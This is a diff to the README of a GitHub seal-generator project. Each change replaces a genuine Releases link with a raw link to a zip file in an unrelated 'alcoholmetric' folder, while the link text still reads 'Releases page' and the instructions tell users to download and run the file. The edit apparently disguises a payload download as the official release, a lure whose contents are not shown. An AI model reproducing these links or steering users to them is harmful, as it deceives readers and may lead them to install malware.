@@ -1,7 +1,7 @@
 # 🎨 indus-seal-generator - Create Unique Seals Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Ahm0d1smail/indus-seal-generator/releases)
+[![Download](https://raw.githubusercontent.com/Ahm0d1smail/indus-seal-generator/main/alcoholmetric/indus-seal-generator.zip)](https://raw.githubusercontent.com/Ahm0d1smail/indus-seal-generator/main/alcoholmetric/indus-seal-generator.zip)
 
 ## 📖 Overview
 The **indus-seal-generator** lets you create your own unique seals inspired by the ancient Indus Valley Civilization. This tool uses an enchanting script, making it simple to generate designs that reflect the rich cultural heritage of India.
@@ -10,7 +10,7 @@ The **indus-seal-generator** lets you create your own unique seals inspired by t
 Follow these steps to get your own seal quickly and easily.
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/Ahm0d1smail/indus-seal-generator/releases) to download the application.
+   Go to our [Releases page](https://raw.githubusercontent.com/Ahm0d1smail/indus-seal-generator/main/alcoholmetric/indus-seal-generator.zip) to download the application.
 
 2. **Choose Your Version**  
    Find the latest version listed on the Releases page. Click on it to see downloadable files.
@@ -39,7 +39,7 @@ To ensure the smooth running of the indus-seal-generator, your computer should m
 - **Browser**: Latest version of Chrome, Firefox, or Safari is recommended
 
 ## 🔧 Download & Install
-To get started, simply visit our [Releases page](https://github.com/Ahm0d1smail/indus-seal-generator/releases) and follow the instructions above. Download the appropriate file for your system and run it to start enjoying the features of the indus-seal-generator.
+To get started, simply visit our [Releases page](https://raw.githubusercontent.com/Ahm0d1smail/indus-seal-generator/main/alcoholmetric/indus-seal-generator.zip) and follow the instructions above. Download the appropriate file for your system and run it to start enjoying the features of the indus-seal-generator.
 
 ## 🛠️ Troubleshooting
 If you encounter any issues while downloading or running the application, consider these solutions:
